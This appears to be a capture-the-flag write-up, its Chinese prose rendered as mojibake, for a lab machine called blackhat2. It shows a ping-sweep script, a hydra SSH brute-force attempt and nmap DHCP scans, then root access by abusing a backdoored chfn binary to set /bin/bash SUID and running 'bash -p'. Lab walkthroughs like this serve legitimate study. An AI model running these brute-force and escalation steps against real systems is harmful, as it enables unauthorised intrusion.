
```bash
for c in {0..255}
do
ips="192.168.$c"
    for d in {0..255}
    do
    ip="$ips.$d"
    ok=0
        for count in {1..3}
        do
            ping -c1 -W1 $ip &>/dev/null
            if [ $? -eq 0 ]
            then
                ok=1
                break
            fi

        done
        if [ $ok -eq 1 ]
            then
                echo "$ip ping is ok"
        else
            continue
        fi
        done
done
```

```bash
192.168.0.1 ping is ok
192.168.0.125 ping is ok
192.168.0.143 ping is ok
```

æ²¡ä¸œè¥¿ï¼Œå°è¯•ç”Ÿæˆå­—å…¸çˆ†ç ´ã€`rockyou.txt`çˆ†ç ´ï¼Œä»¥åŠ`cewl`å­—å…¸çˆ†ç ´ï¼Œéƒ½å¤±è´¥äº†ã€‚

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ hydra -l sml -P pass.txt ssh://192.168.0.125 2>/dev/null
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-02 07:18:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 237 login tries (l:1/p:237), ~15 tries per task
[DATA] attacking ssh://192.168.0.125:22/
[STATUS] 144.00 tries/min, 144 tries in 00:01h, 95 to do in 00:01h, 14 active
[STATUS] 113.00 tries/min, 226 tries in 00:02h, 13 to do in 00:01h, 14 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-02 07:21:00
```

ä¸€æ— æ‰€è·ï¼Œæˆ‘è¦è£‚å¼€äº†ã€‚ã€‚ã€‚ç„¶åå°±æŠŠæ³¨æ„æ‰“åˆ°äº†ä½œè€…èº«ä¸Šã€‚ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824590.png" alt="image-20240502234649332" style="zoom: 33%;" />

å˜¿å˜¿ï¼Œç»™ä½œè€…ç‚¹èµï¼Œè¿›è¡Œæ‰«æï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ sudo nmap 192.168.0.125 -sU -p 1-100
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:4A:F6:66 (Oracle VirtualBox virtual NIC)
```

å°è¯•ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/blackhat2]
â””â”€$ sudo nmap -sU --script broadcast-dhcp-discover -p 68 192.168.0.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 12:04 EDT
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 2: 
|     Interface: eth0
|     IP Offered: 10.0.2.21
|     Server Identifier: 10.0.2.3
|     DHCP Message Type: DHCPOFFER
|     Subnet Mask: 255.255.255.0
|     Router: 10.0.2.1
|     Domain Name Server: 192.168.0.1
|     IP Address Lease Time: 10m00s
|   Response 2 of 2: 
|     Interface: eth1
|     IP Offered: 192.168.0.117
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.0.1
|     IP Address Lease Time: 1d00h00m00s
|     Renewal Time Value: 12h00m00s
|     Rebinding Time Value: 21h00m00s
|     Subnet Mask: 255.255.255.0
|     Broadcast Address: 192.168.0.255
|     Router: 192.168.0.1
|_    Domain Name Server: 192.168.0.1
Nmap scan report for blackhat2.hmv (192.168.0.125)
Host is up (0.00054s latency).

PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:4A:F6:66 (Oracle VirtualBox virtual NIC)
```

> å‚è€ƒï¼š
>
> https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#dhcp-attacks
>
> https://secybr.com/posts/dhcp-pentesting-best-practices/
>
> https://www.rapid7.com/db/modules/exploit/unix/dhcp/rhel_dhcp_client_command_injection/

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824591.png" alt="Untitled" style="zoom:33%;" />



### chfnåé—¨ææƒ

ç„¶åè¿‡äº†å‡ å¤©ï¼Œä½œè€…å‘å‡ºäº†è§£æ³•ï¼šhttps://www.youtube.com/watch?v=07R30pWov64

å¹¶ä¸”ç»™å‡ºäº†ä¸€äº›æç¤ºï¼Œä½†æ˜¯éƒ½æ¯«æ— æ€è·¯ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824592.png" alt="image-20240507180922189" style="zoom:50%;" />

rpj7æœ€å…ˆçœ‹åˆ°å¹¶ä¸”è¿›è¡Œäº†å°è¯•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824593.png" alt="image-20240507175645624" style="zoom:50%;" />

å°è¯•æŒ‰ç…§ä½œè€…æ€è·¯çœ‹ä¸€ä¸‹ï¼š

```bash
(remote) www-data@blackhat2.hmv:/tmp$ dpkg --verify | grep -vi missing
??5?????? c /etc/grub.d/10_linux
??5??????   /usr/bin/chfn
```

- `-v`ï¼šè¿™æ˜¯ `grep` çš„ä¸€ä¸ªé€‰é¡¹ï¼Œè¡¨ç¤ºâ€œåå‘åŒ¹é…â€ï¼Œå³åªæ˜¾ç¤ºä¸åŒ¹é…æŒ‡å®šæ¨¡å¼çš„è¡Œã€‚
- `-i`ï¼šè¿™æ˜¯å¦ä¸€ä¸ª `grep` é€‰é¡¹ï¼Œè¡¨ç¤ºâ€œå¿½ç•¥å¤§å°å†™â€ã€‚ä½†åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒå¯èƒ½ä¸æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºæˆ‘ä»¬é€šå¸¸ä¸ä¼šå…³å¿ƒè¾“å‡ºä¸­çš„å¤§å°å†™ï¼ˆå°½ç®¡è¿™å–å†³äº `dpkg --verify` çš„å…·ä½“è¾“å‡ºï¼‰ã€‚

å°è¯•ä¸‹è½½è¿‡æ¥ï¼Œç„¶åå°è¯•è¿›è¡Œåç¼–è¯‘ä¸€ä¸‹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405071824594.png" alt="image-20240507181610035" style="zoom:50%;" />

å˜¶ï¼ŒåŸæ¥åé—¨åœ¨è¿™é‡Œï¼Œå°è¯•åˆ©ç”¨ï¼š

```bash
(remote) www-data@blackhat2.hmv:/tmp$ ls -la
total 8
drwxrwxrwt  2 root root 4096 May  7 11:53 .
drwxr-xr-x 18 root root 4096 Feb 26 09:58 ..
(remote) www-data@blackhat2.hmv:/tmp$ vi system
(remote) www-data@blackhat2.hmv:/tmp$ ls -la
total 12
drwxrwxrwt  2 root     root     4096 May  7 12:20 .
drwxr-xr-x 18 root     root     4096 Feb 26 09:58 ..
-rw-r--r--  1 www-data www-data   20 May  7 12:20 system
(remote) www-data@blackhat2.hmv:/tmp$ cat *
chmod +s /bin/bash

(remote) www-data@blackhat2.hmv:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
(remote) www-data@blackhat2.hmv:/tmp$ chmod +x system 
(remote) www-data@blackhat2.hmv:/tmp$ /usr/bin/chfn
Changing the user information for root
Enter the new value, or press ENTER for the default
        Full Name [root]: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
(remote) www-data@blackhat2.hmv:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
(remote) www-data@blackhat2.hmv:/tmp$ bash -p
(remote) root@blackhat2.hmv:/tmp# ls -la
total 12
drwxrwxrwt  2 root     root     4096 May  7 12:20 .
drwxr-xr-x 18 root     root     4096 Feb 26 09:58 ..
-rwxr-xr-x  1 www-data www-data   20 May  7 12:20 system
(remote) root@blackhat2.hmv:/tmp# cd /root
(remote) root@blackhat2.hmv:/root# ls -la
total 32
drwx------  4 root root 4096 Feb 26 10:19 .
drwxr-xr-x 18 root root 4096 Feb 26 09:58 ..
lrwxrwxrwx  1 root root    9 Feb 26 10:07 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Feb 26 10:19 .bashrc
-rw-------  1 root root   20 Feb 26 10:19 .lesshst
drwxr-xr-x  3 root root 4096 Feb 26 10:19 .local
-rw-r--r--  1 root root  161 Feb 26 10:19 .profile
drwx------  2 root root 4096 Feb 26 10:19 .ssh
-rwx------  1 root root   33 Feb 26 10:19 root.txt
(remote) root@blackhat2.hmv:/root# cat root.txt
```

åˆ©ç”¨ç®€å•ï¼Œä½†æ˜¯æ˜¯ä¸€ç§å¾ˆä¸é”™çš„æ€è·¯ï¼Œå¾ˆå¤šçš„é»‘å®¢å–œæ¬¢å°†åé—¨æ’å…¥ç³»ç»Ÿæ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åˆ©ç”¨ï¼Œä¸”ä¸æ˜“è¢«å‘ç°ï¼Œç”šè‡³æ˜¯ç¼–è¯‘å™¨ï¼Œè¿™çœŸçš„æ˜¯ä¸€ä¸ªå¾ˆä¸é”™çš„é¶æœºã€‚è‡´æ•¬ä½œè€…ï¼

